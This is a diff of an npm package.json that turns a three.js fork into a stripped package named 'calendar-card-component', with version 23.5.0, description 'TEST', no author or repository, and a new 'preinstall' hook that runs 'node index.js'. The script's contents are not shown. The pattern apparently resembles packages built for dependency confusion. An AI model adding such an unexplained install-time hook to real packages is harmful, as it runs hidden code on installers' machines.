@@ -1,23 +1,12 @@
 {
-  "name": "mtech-three",
-  "version": "1.0.0",
-  "description": "r123 - revision",
-  "main": "three.module.js",
+  "name": "calendar-card-component",
+  "version": "23.5.0",
+  "description": "TEST",
+  "main": "index.js",
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1"
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall":"node index.js"
   },
-  "repository": {
-    "type": "git",
-    "url": "git+https://github.com/sciecode/mtech-three.git"
-  },
-  "keywords": [
-    "three",
-    "mtech"
-  ],
-  "author": "Guilherme Avila - Three.js",
-  "license": "ISC",
-  "bugs": {
-    "url": "https://github.com/sciecode/mtech-three/issues"
-  },
-  "homepage": "https://github.com/sciecode/mtech-three#readme"
+  "author": "",
+  "license": "ISC"
 }
